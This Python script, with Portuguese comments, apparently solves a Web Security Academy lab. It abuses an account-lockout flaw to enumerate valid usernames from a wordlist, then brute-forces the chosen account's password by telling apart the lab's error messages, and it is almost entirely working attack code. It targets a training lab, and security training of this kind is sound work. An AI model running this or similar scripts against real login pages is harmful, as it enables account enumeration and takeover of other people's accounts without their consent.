import requests

# USERNAME:
# A aplicação bloqueia contas existentes a cada 3 tentativas falhas de login,
# logo, é possível enumerar os usernames bloqueados como usernames válidos.
# PASSWORD:
# Quando inserida a senha correta em uma conta bloqueada, por erro lógico no BD,
# a aplicação não mostra mensagem de bloqueio, podendo assim inferir a password do usuário.

url = 'https://0a4400a203b3e8678047125b003f00e2.web-security-academy.net/login'
headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}

with open('wordlist_user.txt', 'r') as arquivo_user:
    list_user = arquivo_user.read().splitlines()

for i in range(len(list_user)):
    for j in range(5):
        data = {
            "username": list_user[i],
            "password": "123456"
        }
        response = requests.post(url, headers=headers, data=data)
        if "Invalid username or password." in response.text:
            pass
        else:
            print(list_user[i])

username = list_user[96]

with open('wordlist_pass.txt', 'r') as arquivo_pass:
    list_pass = arquivo_pass.read().splitlines()
    
for i in range(len(list_pass)):
    data = {
        "username": username,
        "password": list_pass[i]
    }
    response = requests.post(url, headers=headers, data=data)
    
    if "Invalid username or password." in response.text or "You have made too many incorrect login attempts. Please try again in 1 minute(s)." in response.text:
        pass
    else:
        print(username + " -> " + list_pass[i])